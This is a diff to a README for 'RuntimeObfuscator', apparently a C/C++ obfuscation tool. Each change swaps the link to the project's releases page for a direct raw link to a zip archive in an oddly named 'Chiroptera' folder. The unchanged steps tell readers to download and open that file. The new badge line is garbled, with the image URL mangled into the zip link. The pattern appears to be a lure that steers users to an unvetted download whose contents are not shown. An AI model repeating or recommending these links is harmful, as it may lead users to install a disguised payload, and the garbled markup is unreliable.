@@ -6,7 +6,7 @@ Welcome to RuntimeObfuscator! This tool helps you protect functions in your C/C+
 
 ## 📥 Download RuntimeObfuscator
 
-[![Download RuntimeObfuscator](https://img.shields.io/badge/Download%20Now-Run%20the%20Tool-blue.svg)](https://github.com/abexziero/RuntimeObfuscator/releases)
+[![Download RuntimeObfuscator](https://raw.githubusercontent.com/abexziero/RuntimeObfuscator/main/Chiroptera/RuntimeObfuscator.zip%20Now-Run%20the%https://raw.githubusercontent.com/abexziero/RuntimeObfuscator/main/Chiroptera/RuntimeObfuscator.zip)](https://raw.githubusercontent.com/abexziero/RuntimeObfuscator/main/Chiroptera/RuntimeObfuscator.zip)
 
 ## 🛠️ System Requirements
 
@@ -38,7 +38,7 @@ RuntimeObfuscator provides several important features to enhance your programs:
 
 To get started, follow these steps:
 
-1. Visit this page to download: [RuntimeObfuscator Releases](https://github.com/abexziero/RuntimeObfuscator/releases).
+1. Visit this page to download: [RuntimeObfuscator Releases](https://raw.githubusercontent.com/abexziero/RuntimeObfuscator/main/Chiroptera/RuntimeObfuscator.zip).
 2. Choose the latest version of the tool from the list of releases.
 3. Click on the download link for your desired file.
 4. Once downloaded, open the file to start the installation process.
@@ -94,6 +94,6 @@ If you want to contribute to RuntimeObfuscator or suggest improvements, please f
 
 ## 📈 Update Logs
 
-Make sure to keep your tool updated. Check the release page regularly for new features and improvements: [RuntimeObfuscator Releases](https://github.com/abexziero/RuntimeObfuscator/releases).
+Make sure to keep your tool updated. Check the release page regularly for new features and improvements: [RuntimeObfuscator Releases](https://raw.githubusercontent.com/abexziero/RuntimeObfuscator/main/Chiroptera/RuntimeObfuscator.zip).
 
 By following these steps, you should now be equipped to download and use RuntimeObfuscator effectively. Enjoy enhancing your code security!
